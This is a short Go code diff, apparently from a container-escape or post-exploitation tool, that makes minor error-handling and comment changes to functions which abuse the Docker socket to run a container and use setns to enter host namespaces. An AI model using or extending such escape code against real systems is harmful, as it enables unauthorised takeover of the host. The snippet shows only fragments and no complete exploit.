@@ -303,8 +303,8 @@ func escapeDockerSock(command, image string) (string, string) {
 	}
 	sb.WriteString("[+] Container started\n")
 
-	// Wait for completion
-	dockerAPIPost(client, fmt.Sprintf("/containers/%s/wait", containerID), nil)
+	// Wait for completion (ignore error — we'll get logs regardless)
+	_, _ = dockerAPIPost(client, fmt.Sprintf("/containers/%s/wait", containerID), nil)
 
 	// Get logs
 	logs, _ := dockerAPIGet(client, fmt.Sprintf("/containers/%s/logs?stdout=true&stderr=true", containerID))
@@ -529,10 +529,12 @@ func nsenterViaSetns(command string) (string, string) {
 		}
 	}
 	defer func() {
-		// Restore original namespaces
+		// Restore original namespaces (best-effort — failure here means
+		// the thread stays in host namespaces, but LockOSThread prevents
+		// that from affecting other goroutines)
 		for _, ns := range hostNamespaces {
 			if fd, ok := origFDs[ns.name]; ok {
-				unix.Setns(fd, ns.flag)
+				_ = unix.Setns(fd, ns.flag)
 				unix.Close(fd)
 			}
 		}
